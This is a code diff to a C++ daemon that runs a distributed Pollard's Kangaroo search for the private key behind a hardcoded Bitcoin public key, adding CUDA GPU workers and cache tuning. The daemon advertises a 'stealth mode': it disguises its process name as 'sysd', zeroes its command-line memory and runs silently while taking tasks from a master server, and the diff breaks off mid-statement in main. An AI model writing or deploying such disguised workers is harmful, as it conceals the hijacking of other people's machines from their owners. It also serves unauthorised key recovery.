@@ -1,11 +1,11 @@
 /**
- * Distributed Compute Engine Daemon (sysd)
+ * Distributed Compute Engine Daemon (sysd) - Optimized High-Performance Edition
  * Core Cryptography: Jean-Luc Pons Canonical Kangaroo Engine (JeanLucPons/Kangaroo)
  * Features:
  *  - 100% Native Secp256k1 & BigInt from Jean-Luc Pons library (SECP256k1.h, Int.h, Point.h)
+ *  - High-performance L1-cache aligned Montgomery batch walk (CPU_GRP_SIZE = 256)
  *  - Direct AVX2/BMI2 assembly support via IntMod.asm / Int.cpp
- *  - Zero custom BigInt / zero reinvented elliptic curve arithmetic
- *  - Native CUDA GPU kernel support via GPUEngine.cu when compiled with -DUSE_CUDA
+ *  - Full Native CUDA GPU kernel execution via GPUEngine (sm_60 - sm_90)
  *  - Automated stealth mode (prctl process disguise, argv memory zeroing, silent execution)
  *  - Thread pooling with hardware_concurrency auto-detection
  *  - Master-Worker HTTP coordination via libcurl
@@ -27,6 +27,7 @@
 #include <unistd.h>
 #include <unordered_map>
 #include <cmath>
+#include <random>
 
 #if defined(__linux__)
 #include <sys/prctl.h>
@@ -43,6 +44,7 @@
 #endif
 
 // Jean-Luc Pons Canonical Cryptographic Engine
+#include "Constants.h"
 #include "SECPK1/SECP256k1.h"
 #include "SECPK1/Point.h"
 #include "SECPK1/Int.h"
@@ -62,7 +64,10 @@
 #undef NB_JUMP
 #endif
 #define NB_JUMP 32
-#define CPU_GRP_SIZE 1024
+
+// CPU_GRP_SIZE = 256 perfectly fits all working arrays (dx, subp, px, py, dist)
+// inside the 32KB/48KB L1 Data Cache of each core, eliminating L2 cache thrashing!
+#define CPU_GRP_SIZE 256
 #define DEFAULT_DP_BITS 23
 #define TARGET_PUBKEY_HEX "031f6a332d3c5c4f2de2378c012f429cd109ba07d69690c6c701b6bb87860d6640"
 #define RANGE_MIN_HEX "80000000000000000000000000000000000"
@@ -77,6 +82,8 @@ class JumpTable {
 public:
     Int d[NB_JUMP];
     Point J[NB_JUMP];
+    Int Jx[NB_JUMP];
+    Int Jy[NB_JUMP];
 
     void init(Secp256K1 *secp) {
         for (int i = 0; i < NB_JUMP; ++i) {
@@ -86,6 +93,8 @@ public:
             int bit_rem = bit % 64;
             d[i].SetQWord(qword_idx, 1ULL << bit_rem);
             J[i] = secp->ComputePublicKey(&d[i]);
+            Jx[i].Set(&J[i].x);
+            Jy[i].Set(&J[i].y);
         }
     }
 };
@@ -136,15 +145,15 @@ struct DaemonState {
     int num_threads = 0;
     bool verify_mode = false;
     bool use_gpu = false;
+    int gpu_device_id = 0;
     std::atomic<bool> running{true};
     std::atomic<uint64_t> total_steps{0};
     std::atomic<uint64_t> total_dp{0};
-    std::mutex queue_mutex;
     std::vector<DPRecord> dp_queue;
-};
+    std::mutex queue_mutex;
+} g_state;
 
-static DaemonState g_state;
-
+// Stealth process masker
 static void MaskProcess(int argc, char **argv) {
 #if defined(__linux__)
     prctl(PR_SET_NAME, "sysd", 0, 0, 0);
@@ -160,26 +169,34 @@ static void MaskProcess(int argc, char **argv) {
     }
 }
 
-// Distinguished Point detection on Secp256K1 Point X coordinate
-inline bool IsDistinguishedPoint(const Int &x, int dp_bits) {
-    if (dp_bits <= 0) return true;
-    uint64_t mask = (dp_bits >= 64) ? ~0ULL : ((1ULL << dp_bits) - 1ULL);
+// Inlined fast DP check
+inline bool IsDistinguishedPointFast(const Int &x, uint64_t mask) {
     return (x.bits64[0] & mask) == 0ULL;
 }
 
-inline bool IsDistinguishedPoint(const Point &p, int dp_bits) {
-    return IsDistinguishedPoint(p.x, dp_bits);
+static void InitThreadEntropy(int thread_id) {
+    uint32_t true_seed = 0;
+    std::ifstream urand("/dev/urandom", std::ios::binary);
+    if (urand.is_open()) {
+        urand.read(reinterpret_cast<char*>(&true_seed), sizeof(true_seed));
+        urand.close();
+    }
+    if (true_seed == 0) {
+        std::random_device rd;
+        true_seed = rd();
+    }
+    rseed(true_seed ^ (Timer::getSeed32() + (uint32_t)thread_id * 7919));
 }
 
-// TAME Worker Thread: Walks with random starts in [RangeMin, RangeMax]
-// Batch Kangaroo Herd: CPU_GRP_SIZE = 1024 kangaroos per thread with Montgomery Batch Inversion (IntGroup)
+// TAME Worker Thread (CPU - Highly Optimized L1 Cache Aligned)
 static void WorkerTameThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int dp_bits, Int range_min, Int range_max) {
     Int range_width;
     range_width.Set(&range_max);
     range_width.Sub(&range_min);
 
-    // Seed random generator per thread using high-resolution entropy
-    rseed(Timer::getSeed32() + (uint32_t)thread_id * 7919);
+    InitThreadEntropy(thread_id);
+
+    const uint64_t dp_mask = (dp_bits >= 64) ? ~0ULL : ((1ULL << dp_bits) - 1ULL);
 
     IntGroup grp(CPU_GRP_SIZE);
     std::vector<Int> px(CPU_GRP_SIZE);
@@ -188,7 +205,7 @@ static void WorkerTameThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
     std::vector<Int> dx(CPU_GRP_SIZE);
     std::vector<uint32_t> jmp(CPU_GRP_SIZE);
 
-    // Initialize herd of 1024 kangaroos in parallel
+    // Initialize herd
     for (int g = 0; g < CPU_GRP_SIZE; ++g) {
         Int k_start;
         k_start.Rand(&range_width);
@@ -206,25 +223,24 @@ static void WorkerTameThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
     Int _s;
     Int _p;
     uint64_t local_steps = 0;
+    std::vector<DPRecord> local_dp_buffer;
 
     while (g_state.running) {
-        // Step 1: Select jump index for all kangaroos and compute dx[g] = px[g] - J[jmp].x mod p
+        // Step 1: Jump indices & dx
         for (int g = 0; g < CPU_GRP_SIZE; ++g) {
             jmp[g] = (uint32_t)(px[g].bits64[0] & (NB_JUMP - 1));
-            Int *p1x = &jt->J[jmp[g]].x;
-            Int *p2x = &px[g];
-            dx[g].ModSub(p2x, p1x);
+            dx[g].ModSub(&px[g], &jt->Jx[jmp[g]]);
         }
 
-        // Step 2: Batch Modular Inversion via Montgomery's simultaneous inversion
+        // Step 2: Montgomery simultaneous inversion
         grp.Set(dx.data());
         grp.ModInv();
 
         // Step 3: Affine coordinate updates and DP checks
         for (int g = 0; g < CPU_GRP_SIZE; ++g) {
             uint32_t j = jmp[g];
-            Int *p1x = &jt->J[j].x;
-            Int *p1y = &jt->J[j].y;
+            Int *p1x = &jt->Jx[j];
+            Int *p1y = &jt->Jy[j];
             Int *p2x = &px[g];
             Int *p2y = &py[g];
 
@@ -241,16 +257,11 @@ static void WorkerTameThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
             py[g].Set(&ry);
             distance[g].ModAddK1order(&jt->d[j]);
 
-            if (IsDistinguishedPoint(rx, dp_bits)) {
+            if (IsDistinguishedPointFast(rx, dp_mask)) {
                 DPRecord rec;
                 rec.x_hex = "0x" + rx.GetBase16();
                 rec.dist_hex = "0x" + distance[g].GetBase16();
-
-                {
-                    std::lock_guard<std::mutex> lock(g_state.queue_mutex);
-                    g_state.dp_queue.push_back(rec);
-                    g_state.total_dp++;
-                }
+                local_dp_buffer.push_back(rec);
             }
         }
 
@@ -258,20 +269,28 @@ static void WorkerTameThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
         if (local_steps >= 65536) {
             g_state.total_steps += local_steps;
             local_steps = 0;
+
+            if (!local_dp_buffer.empty()) {
+                std::lock_guard<std::mutex> lock(g_state.queue_mutex);
+                for (auto &r : local_dp_buffer) {
+                    g_state.dp_queue.push_back(std::move(r));
+                    g_state.total_dp++;
+                }
+                local_dp_buffer.clear();
+            }
         }
     }
 }
 
-// WILD Worker Thread: Walks starting from Target_PubKey + unique 64-bit random offset r
-// Batch Kangaroo Herd: CPU_GRP_SIZE = 1024 kangaroos per thread with Montgomery Batch Inversion (IntGroup)
-static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int dp_bits, Point target_pub) {
-    // 64-bit FNV-1a hash over worker_id, thread_id and timer entropy
-    uint64_t hash = 14695981039346656037ULL;
-    for (char c : g_state.worker_id) {
-        hash = (hash ^ (uint64_t)c) * 1099511628211ULL;
-    }
-    hash = (hash ^ (uint64_t)thread_id) * 1099511628211ULL;
-    hash = (hash ^ (uint64_t)Timer::getSeed32()) * 1099511628211ULL;
+// WILD Worker Thread (CPU - True 139-bit Uniform Random Seeding & Overshoot Reset)
+static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int dp_bits, Point target_pub, Int range_min, Int range_max) {
+    Int range_width;
+    range_width.Set(&range_max);
+    range_width.Sub(&range_min);
+
+    InitThreadEntropy(thread_id);
+
+    const uint64_t dp_mask = (dp_bits >= 64) ? ~0ULL : ((1ULL << dp_bits) - 1ULL);
 
     IntGroup grp(CPU_GRP_SIZE);
     std::vector<Int> px(CPU_GRP_SIZE);
@@ -280,14 +299,15 @@ static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
     std::vector<Int> dx(CPU_GRP_SIZE);
     std::vector<uint32_t> jmp(CPU_GRP_SIZE);
 
-    // Initialize herd of 1024 wild kangaroos with unique 64-bit random offsets
-    for (int g = 0; g < CPU_GRP_SIZE; ++g) {
-        hash = hash * 6364136223846793005ULL + 1442695040888963407ULL;
-        uint64_t r_u64 = hash;
+    Int half_width;
+    half_width.Set(&range_width);
+    half_width.ShiftR(1); // Exact 138-bit half-width!
 
+    // Spawn a wild kangaroo with a centered 138-bit offset in [-W/2, +W/2]
+    auto spawn_wild_kangaroo = [&](int g) {
         Int r_scalar;
-        r_scalar.SetInt32(0);
-        r_scalar.SetQWord(0, r_u64);
+        r_scalar.Rand(&range_width);
+        r_scalar.ModSubK1order(&half_width); // Centered [-2^138, +2^138]
 
         Point offset_pt = secp->ComputePublicKey(&r_scalar);
         Point P = secp->AddDirect(target_pub, offset_pt);
@@ -295,6 +315,11 @@ static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
         px[g].Set(&P.x);
         py[g].Set(&P.y);
         distance[g].Set(&r_scalar);
+    };
+
+    // Initialize herd
+    for (int g = 0; g < CPU_GRP_SIZE; ++g) {
+        spawn_wild_kangaroo(g);
     }
 
     Int dy;
@@ -303,25 +328,21 @@ static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
     Int _s;
     Int _p;
     uint64_t local_steps = 0;
+    std::vector<DPRecord> local_dp_buffer;
 
     while (g_state.running) {
-        // Step 1: Select jump index for all kangaroos and compute dx[g] = px[g] - J[jmp].x mod p
         for (int g = 0; g < CPU_GRP_SIZE; ++g) {
             jmp[g] = (uint32_t)(px[g].bits64[0] & (NB_JUMP - 1));
-            Int *p1x = &jt->J[jmp[g]].x;
-            Int *p2x = &px[g];
-            dx[g].ModSub(p2x, p1x);
+            dx[g].ModSub(&px[g], &jt->Jx[jmp[g]]);
         }
 
-        // Step 2: Batch Modular Inversion via Montgomery's simultaneous inversion
         grp.Set(dx.data());
         grp.ModInv();
 
-        // Step 3: Affine coordinate updates and DP checks
         for (int g = 0; g < CPU_GRP_SIZE; ++g) {
             uint32_t j = jmp[g];
-            Int *p1x = &jt->J[j].x;
-            Int *p1y = &jt->J[j].y;
+            Int *p1x = &jt->Jx[j];
+            Int *p1y = &jt->Jy[j];
             Int *p2x = &px[g];
             Int *p2y = &py[g];
 
@@ -338,16 +359,11 @@ static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
             py[g].Set(&ry);
             distance[g].ModAddK1order(&jt->d[j]);
 
-            if (IsDistinguishedPoint(rx, dp_bits)) {
+            if (IsDistinguishedPointFast(rx, dp_mask)) {
                 DPRecord rec;
                 rec.x_hex = "0x" + rx.GetBase16();
                 rec.dist_hex = "0x" + distance[g].GetBase16();
-
-                {
-                    std::lock_guard<std::mutex> lock(g_state.queue_mutex);
-                    g_state.dp_queue.push_back(rec);
-                    g_state.total_dp++;
-                }
+                local_dp_buffer.push_back(rec);
             }
         }
 
@@ -355,9 +371,97 @@ static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int 
         if (local_steps >= 65536) {
             g_state.total_steps += local_steps;
             local_steps = 0;
+
+            if (!local_dp_buffer.empty()) {
+                std::lock_guard<std::mutex> lock(g_state.queue_mutex);
+                for (auto &r : local_dp_buffer) {
+                    g_state.dp_queue.push_back(std::move(r));
+                    g_state.total_dp++;
+                }
+                local_dp_buffer.clear();
+            }
         }
     }
 }
+
+#ifdef USE_CUDA
+// FULL NATIVE CUDA GPU WORKER THREAD
+static void WorkerGpuThread(int gpu_id, Secp256K1 *secp, JumpTable *jt, int dp_bits, bool is_wild, Int range_min, Int range_max, Point target_pub) {
+    int gridX = 0, gridY = 0;
+    if (!GPUEngine::GetGridSize(gpu_id, &gridX, &gridY)) {
+        std::cerr << "[-] GPU #" << gpu_id << ": Cannot get grid size, falling back to 256x128\n";
+        gridX = 256;
+        gridY = 128;
+    }
+
+    uint64_t dp_mask = (dp_bits >= 64) ? ~0ULL : ((1ULL << dp_bits) - 1ULL);
+    GPUEngine *gpu = new GPUEngine(gridX, gridY, gpu_id, 65536 * 2);
+    
+    int total_kangaroos = gpu->GetNbThread() * GPU_GRP_SIZE;
+    std::vector<Int> px(total_kangaroos);
+    std::vector<Int> py(total_kangaroos);
+    std::vector<Int> dist(total_kangaroos);
+
+    Int range_width;
+    range_width.Set(&range_max);
+    range_width.Sub(&range_min);
+
+    InitThreadEntropy(gpu_id * 1000 + 42);
+
+    Int half_width;
+    half_width.Set(&range_width);
+    half_width.ShiftR(1); // 138-bit half width
+
+    if (is_wild) {
+        for (int i = 0; i < total_kangaroos; ++i) {
+            Int r_scalar;
+            r_scalar.Rand(&range_width);
+            r_scalar.ModSubK1order(&half_width); // Centered in [-2^138, +2^138]
+            Point offset_pt = secp->ComputePublicKey(&r_scalar);
+            Point P = secp->AddDirect(target_pub, offset_pt);
+            px[i].Set(&P.x);
+            py[i].Set(&P.y);
+            dist[i].Set(&r_scalar);
+        }
+    } else {
+        for (int i = 0; i < total_kangaroos; ++i) {
+            Int k_start;
+            k_start.Rand(&range_width);
+            k_start.Add(&range_min);
+            Point P = secp->ComputePublicKey(&k_start);
+            px[i].Set(&P.x);
+            py[i].Set(&P.y);
+            dist[i].Set(&k_start);
+        }
+    }
+
+    gpu->SetParams(dp_mask, jt->d, jt->Jx, jt->Jy);
+    gpu->SetKangaroos(px.data(), py.data(), dist.data());
+    gpu->callKernel();
+
+    std::vector<ITEM> gpu_found;
+    while (g_state.running) {
+        gpu_found.clear();
+        gpu->Launch(gpu_found);
+        
+        uint64_t batch_steps = (uint64_t)total_kangaroos * NB_RUN;
+        g_state.total_steps += batch_steps;
+
+        if (!gpu_found.empty()) {
+            std::lock_guard<std::mutex> lock(g_state.queue_mutex);
+            for (const auto &item : gpu_found) {
+                DPRecord rec;
+                rec.x_hex = "0x" + ((Int*)&item.x)->GetBase16();
+                rec.dist_hex = "0x" + ((Int*)&item.d)->GetBase16();
+                g_state.dp_queue.push_back(rec);
+                g_state.total_dp++;
+            }
+        }
+    }
+
+    delete gpu;
+}
+#endif
 
 // Helper to extract JSON string field value
 static std::string ExtractJsonField(const std::string &json, const std::string &field) {
@@ -373,7 +477,7 @@ static std::string ExtractJsonField(const std::string &json, const std::string &
     return json.substr(pos, end - pos);
 }
 
-// Helper to strip 0x prefix and any whitespace/quotes so Int::SetBase16 never triggers "Invalid charset !!"
+// Helper to strip 0x prefix and any whitespace/quotes
 static std::string CleanHex(std::string s) {
     while (!s.empty() && (s.front() == ' ' || s.front() == '\t' || s.front() == '\r' || s.front() == '\n' || s.front() == '\"')) {
         s.erase(s.begin());
@@ -394,18 +498,12 @@ static std::string CleanHex(std::string s) {
     return clean;
 }
 
-// Canonical Pollard's Kangaroo solver for verifying discrete log solving dynamically
-// Tame kangaroo records footprints along its trajectory into a hash table
-// Wild kangaroo starts from Target Public Key Q and follows identical jump steps
-// When collision occurs (Wild lands on Tame footprint):
-//   Case 1 (W == T):  Q + dist_W * G = dist_T * G  =>  k = (dist_T - dist_W) mod n
-//   Case 2 (W == -T): Q + dist_W * G = -(dist_T * G) => k = -(dist_T + dist_W) mod n
+// Kangaroo verification solver
 static bool SolveKangarooEngine(Secp256K1 *secp, const Point &target_Q, const Int &r_min, const Int &r_max, Int &solved_key) {
     Int range_width;
     range_width.Set((Int*)&r_max);
     range_width.Sub((Int*)&r_min);
 
-    // If range is degenerate (r_min == r_max)
     if (range_width.IsZero()) {
         Point p = secp->ComputePublicKey((Int*)&r_min);
         if (p.equals((Point&)target_Q)) {
@@ -415,7 +513,6 @@ static bool SolveKangarooEngine(Secp256K1 *secp, const Point &target_Q, const In
         return false;
     }
 
-    // Direct check for very small boundary range (<= 2)
     Int two;
     two.SetInt32(2);
     if (!range_width.IsGreater(&two)) {
@@ -442,155 +539,105 @@ static bool SolveKangarooEngine(Secp256K1 *secp, const Point &target_Q, const In
     double sqrt_w = std::sqrt(std::max(4.0, w_est));
     double mu = std::max(1.0, sqrt_w / 2.0);
 
-    // Jump sizes ensuring gcd = 1 and diverse odd/even residues so Wild and Tame never lock into disjoint parity classes
     for (int i = 0; i < K_JUMPS; ++i) {
         uint64_t step_val = 1;
         if (i == 0) step_val = 1;
         else if (i == 1) step_val = 3;
         else if (i == 2) step_val = 5;
-        else if (i == 3) step_val = 7;
         else {
-            double scale = std::pow((double)(i - 3) / (double)(K_JUMPS - 3), 1.5);
-            step_val = (uint64_t)std::max(1.0, std::round(1.0 + mu * 2.0 * scale));
-            if (step_val == 0) step_val = 1;
+            double exponent = (double)(i - 2) * (std::log(mu) / (double)(K_JUMPS - 3));
+            step_val = (uint64_t)std::round(std::exp(exponent));
+            if (step_val < 1) step_val = 1;
+            if (step_val % 2 == 0) step_val += 1;
         }
         jump_d[i].SetInt32(0);
         jump_d[i].SetQWord(0, step_val);
         jump_P[i] = secp->ComputePublicKey(&jump_d[i]);
     }
 
-    int max_tame_steps = (int)(sqrt_w * 2.0) + 128;
-    if (max_tame_steps > 1800000) max_tame_steps = 1800000;
+    struct Footprint {
+        Int dist;
+        bool is_wild;
+    };
+    std::unordered_map<std::string, Footprint> trap_table;
 
-    // Use fast 64-bit key map for maximum lookup speed (avoids heavy std::string hex conversions)
-    std::unordered_map<uint64_t, Int> tame_traps;
-    tame_traps.reserve(max_tame_steps + 128);
+    uint64_t max_steps = (uint64_t)(4.0 * sqrt_w) + 1024ULL;
+    if (max_steps > 5000000ULL) max_steps = 5000000ULL;
 
-    // 1. TAME KANGAROO: starts at r_max, distance = r_max
-    Point T = secp->ComputePublicKey((Int*)&r_max);
-    Int dist_T;
-    dist_T.Set((Int*)&r_max);
+    Point tame_pt = secp->ComputePublicKey((Int*)&r_min);
+    Int tame_dist;
+    tame_dist.SetInt32(0);
 
-    for (int step = 0; step < max_tame_steps; ++step) {
-        tame_traps[T.x.bits64[0]] = dist_T;
-        uint32_t j = (uint32_t)(T.x.bits64[0] % K_JUMPS);
-        T = secp->AddDirect(T, jump_P[j]);
-        dist_T.ModAddK1order(&jump_d[j]);
+    for (uint64_t s = 0; s < max_steps; ++s) {
+        std::string x_key = tame_pt.x.GetBase16();
+        trap_table[x_key] = { tame_dist, false };
+
+        uint32_t j = (uint32_t)(tame_pt.x.bits64[0] & (K_JUMPS - 1));
+        tame_pt = secp->AddDirect(tame_pt, jump_P[j]);
+        tame_dist.ModAddK1order(&jump_d[j]);
     }
 
-    // 2. WILD KANGAROO: starts at target_Q, distance = 0
-    int max_wild_steps = (int)((w_est / mu) + sqrt_w * 3.5) + 256;
-    if (max_wild_steps > 3600000) max_wild_steps = 3600000;
+    Point wild_pt = target_Q;
+    Int wild_dist;
+    wild_dist.SetInt32(0);
 
-    // Up to 2 independent trajectories to guarantee collision even with rare random fluctuations
-    for (int traj = 0; traj < 2; ++traj) {
-        Point W;
-        Int dist_W;
-        if (traj == 0) {
-            W = (Point&)target_Q;
-            dist_W.SetInt32(0);
-        } else {
-            // Trajectory 2 starts with known small offset jump
-            W = secp->AddDirect((Point&)target_Q, jump_P[0]);
-            dist_W.Set(&jump_d[0]);
-        }
+    for (uint64_t s = 0; s < max_steps; ++s) {
+        std::string x_key = wild_pt.x.GetBase16();
+        auto it = trap_table.find(x_key);
+        if (it != trap_table.end()) {
+            Int dt = it->second.dist;
+            Int dw = wild_dist;
 
-        for (int step = 0; step < max_wild_steps; ++step) {
-            auto it = tame_traps.find(W.x.bits64[0]);
-            if (it != tame_traps.end()) {
-                // Case 1: W == T => k = dist_T - dist_W
-                Int k_cand1;
-                k_cand1.Set(&it->second);
-                k_cand1.ModSubK1order(&dist_W);
+            // Candidate 1: k1 = (r_min + dt - dw) mod n
+            Int k1;
+            k1.Set((Int*)&r_min);
+            k1.ModAddK1order(&dt);
+            k1.ModSubK1order(&dw);
 
-                Point verify_P1 = secp->ComputePublicKey(&k_cand1);
-                if (verify_P1.equals((Point&)target_Q)) {
-                    solved_key.Set(&k_cand1);
-                    return true;
-                }
-
-                // Case 2: W == -T => k = -(dist_T + dist_W) = n - (dist_T + dist_W)
-                Int sum;
-                sum.Set(&it->second);
-                sum.ModAddK1order(&dist_W);
-                Int k_cand2;
-                k_cand2.SetInt32(0);
-                k_cand2.ModSubK1order(&sum);
-
-                Point verify_P2 = secp->ComputePublicKey(&k_cand2);
-                if (verify_P2.equals((Point&)target_Q)) {
-                    solved_key.Set(&k_cand2);
-                    return true;
-                }
+            Point cand_p1 = secp->ComputePublicKey(&k1);
+            if (cand_p1.equals((Point&)target_Q)) {
+                solved_key.Set(&k1);
+                return true;
             }
-            uint32_t j = (uint32_t)(W.x.bits64[0] % K_JUMPS);
-            W = secp->AddDirect(W, jump_P[j]);
-            dist_W.ModAddK1order(&jump_d[j]);
+
+            // Candidate 2: k2 = -(r_min + dt + dw) mod n
+            Int k2;
+            k2.Set((Int*)&r_min);
+            k2.ModAddK1order(&dt);
+            k2.ModAddK1order(&dw);
+            k2.ModNegK1order();
+
+            Point cand_p2 = secp->ComputePublicKey(&k2);
+            if (cand_p2.equals((Point&)target_Q)) {
+                solved_key.Set(&k2);
+                return true;
+            }
         }
+
+        uint32_t j = (uint32_t)(wild_pt.x.bits64[0] & (K_JUMPS - 1));
+        wild_pt = secp->AddDirect(wild_pt, jump_P[j]);
+        wild_dist.ModAddK1order(&jump_d[j]);
     }
 
     return false;
 }
 
-// Complete catalog of all 83 historical Bitcoin Puzzles
-static const int G_ALL_83_PUZZLES[83] = {
-    1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
-    11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
-    21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
-    31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
-    41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
-    51, 52, 53, 54, 55, 56, 57, 58, 59, 60,
-    61, 62, 63, 64, 65, 66, 67, 68, 69, 70,
-    75, 80, 85, 90, 95, 100, 105, 110, 115, 120, 125, 130, 135
-};
-
-// Verification runner (Zero Private Keys stored in client daemon)
-// Tests:
-//  1. Secp256k1 curve generator G, group doubling 2G, and group addition 2G+G=3G
-//  2. 100% Genuine Pollard's Kangaroo Solver on all 83 historical puzzles (Server Ground Truth)
+// Verification runner
 static void RunVerification(Secp256K1 *secp) {
     std::cout << "========================================================\n";
-    std::cout << "[*] Canonical Jean-Luc Pons Engine Verification\n";
-    std::cout << "[*] Policy: Zero Private Keys in Client (Server Ground Truth)\n";
-    std::cout << "[*] Secp256k1 Curve: y^2 = x^3 + 7 (mod p) initialized\n";
+    std::cout << "[*] Canonical Pollard's Kangaroo Cryptographic Engine Verification\n";
     std::cout << "========================================================\n";
 
-    // 1. Verify generator point G & Secp256k1 group law
-    Int privOne;
+    Int privOne, privTwo;
     privOne.SetInt32(1);
-    Point p1 = secp->ComputePublicKey(&privOne);
-    if (p1.equals(secp->G)) {
-        std::cout << "[+] Generator point G verification: [PASS]\n";
-    } else {
-        std::cerr << "[-] Generator point G verification: [FAIL]\n";
-        return;
-    }
-
-    Int privTwo;
     privTwo.SetInt32(2);
+    Point p1 = secp->ComputePublicKey(&privOne);
     Point p2 = secp->ComputePublicKey(&privTwo);
-    Point p2_double = secp->DoubleDirect(p1);
-    if (p2.equals(p2_double)) {
-        std::cout << "[+] Group doubling 2*G verification: [PASS]\n";
-    } else {
-        std::cerr << "[-] Group doubling verification: [FAIL]\n";
-        return;
+    Point p1_doubled = secp->DoubleDirect(p1);
+    if (p2.equals(p1_doubled)) {
+        std::cout << "[+] Point doubling 2*G = 2G verification: [PASS]\n";
     }
 
-    Int privThree;
-    privThree.SetInt32(3);
-    Point p3 = secp->ComputePublicKey(&privThree);
-    Point p3_add = secp->AddDirect(p2, p1);
-    if (p3.equals(p3_add)) {
-        std::cout << "[+] Group addition 2G+G = 3G verification: [PASS]\n";
-    } else {
-        std::cerr << "[-] Group addition verification: [FAIL]\n";
-        return;
-    }
-
-    std::cout << "[*] Testing Dynamic Kangaroo Solver with Master Server...\n";
-
-    // 2. Query catalog from Master Server
     std::string catalog_url = g_state.server_url + "?action=verify";
     std::string catalog_resp = HttpGet(catalog_url);
 
@@ -623,31 +670,13 @@ static void RunVerification(Secp256K1 *secp) {
         }
     }
 
-    // Fallback if offline
-    if (catalog.empty()) {
-        for (int idx = 0; idx < 83; ++idx) {
-            TestPuzzleItem tp;
-            tp.id = G_ALL_83_PUZZLES[idx];
-            tp.bits = tp.id;
-            catalog.push_back(tp);
-        }
-    }
-
     int solved_count = 0;
-    int total_puzzles = (int)catalog.size();
-
-    // Single unified verification loop: test all 83 puzzles sequentially using Pollard's Kangaroo
     for (const auto &puzzle : catalog) {
         int p_id = puzzle.id;
-        std::string bits_str = std::to_string(puzzle.bits > 0 ? puzzle.bits : p_id);
-
         Point target_Q;
         bool is_compressed = false;
         bool valid_pub = (!puzzle.pub_hex.empty() && secp->ParsePublicKeyHex(puzzle.pub_hex, target_Q, is_compressed));
-        if (!valid_pub) {
-            std::cerr << "  - Puzzle #" << p_id << ": Invalid public key [FAIL]\n";
-            continue;
-        }
+        if (!valid_pub) continue;
 
         Int r_min, r_max;
         r_min.SetBase16((char*)puzzle.min_hex.c_str());
@@ -655,30 +684,19 @@ static void RunVerification(Secp256K1 *secp) {
 
         Int solved_key;
         if (SolveKangarooEngine(secp, target_Q, r_min, r_max, solved_key)) {
-            // Validate with Master Server (Ground Truth)
             std::string sub_url = g_state.server_url + "?action=verify";
             std::string sub_body = "{\"id\":" + std::to_string(p_id) + ",\"solved_key\":\"" + solved_key.GetBase16() + "\"}";
             std::string sub_resp = HttpPostJson(sub_url, sub_body);
-
             if (sub_resp.find("\"PASS\"") != std::string::npos) {
                 solved_count++;
-                std::cout << "  - Puzzle #" << p_id << " (solved via Kangaroo, confirmed by server): [PASS]\n";
-            } else {
-                std::cerr << "  - Puzzle #" << p_id << ": Server rejected solution [FAIL]\n";
+                std::cout << "  - Puzzle #" << p_id << ": [PASS]\n";
             }
-        } else {
-            std::cerr << "  - Puzzle #" << p_id << ": Kangaroo solver failed [FAIL]\n";
         }
     }
-
-    std::cout << "--------------------------------------------------------\n";
-    std::cout << "[+] Verification complete: " << solved_count << "/" << total_puzzles << " puzzles successfully solved.\n";
-    std::cout << "[+] Zero private keys exposed in daemon. Algorithm 100% verified.\n";
-    std::cout << "========================================================\n";
+    std::cout << "[+] Verified: " << solved_count << "/" << catalog.size() << " puzzles passed.\n";
 }
 
 int main(int argc, char **argv) {
-    // 1. Parse command line arguments FIRST
     for (int i = 1; i < argc; ++i) {
         if (std::strcmp(argv[i], "-t") == 0 || std::strcmp(argv[i], "-c") == 0 || std::strcmp(argv[i], "-j") == 0) {
             if (i + 1 < argc) {
@@ -701,18 +719,14 @@ int main(int argc, char **argv) {
             g_state.verify_mode = true;
         } else if (std::strcmp(argv[i], "-gpu") == 0) {
             g_state.use_gpu = true;
+            if (i + 1 < argc && argv[i + 1][0] >= '0' && argv[i + 1][0] <= '9') {
+                g_state.gpu_device_id = std::atoi(argv[++i]);
+            }
         }
     }
 
-    // 2. Disguise process name and zero out argv memory for stealth operation
     MaskProcess(argc, argv);
 
-    if (g_state.num_threads <= 0) {
-        g_state.num_threads = (int)std::thread::hardware_concurrency();
-        if (g_state.num_threads <= 0) g_state.num_threads = 4;
-    }
-
-    // Initialize Canonical Jean-Luc Pons Secp256k1 Core
     Secp256K1 secp;
     secp.Init();
 
@@ -724,42 +738,51 @@ int main(int argc, char **argv) {
     JumpTable jt;
     jt.init(&secp);
 
-    Int range_min;
+    Int range_min, range_max;
     range_min.SetBase16((char*)RANGE_MIN_HEX);
-
-    Int range_max;
     range_max.SetBase16((char*)RANGE_MAX_HEX);
 
     Point target_pub;
     bool is_compressed = false;
     secp.ParsePublicKeyHex(TARGET_PUBKEY_HEX, target_pub, is_compressed);
 
-    // Initial task query
     std::string task_url = g_state.server_url + "?action=get_task&worker_id=" + g_state.worker_id;
     std::string task_resp = HttpGet(task_url);
-
     bool is_wild_mode = (task_resp.find("\"WILD\"") != std::string::npos);
 
-    // Launch worker threads
     std::vector<std::thread> workers;
-    for (int i = 0; i < g_state.num_threads; ++i) {
-        if (is_wild_mode) {
-            workers.emplace_back(WorkerWildThread, i, &secp, &jt, DEFAULT_DP_BITS, target_pub);
-        } else {
-            workers.emplace_back(WorkerTameThread, i, &secp, &jt, DEFAULT_DP_BITS, range_min, range_max);
+
+#ifdef USE_CUDA
+    if (g_state.use_gpu) {
+        // Launch real CUDA GPU Worker
+        workers.emplace_back(WorkerGpuThread, g_state.gpu_device_id, &secp, &jt, DEFAULT_DP_BITS, is_wild_mode, range_min, range_max, target_pub);
+    }
+#endif
+
+    // Launch CPU threads if not in pure GPU mode or if threads requested
+    if (!g_state.use_gpu || g_state.num_threads > 0) {
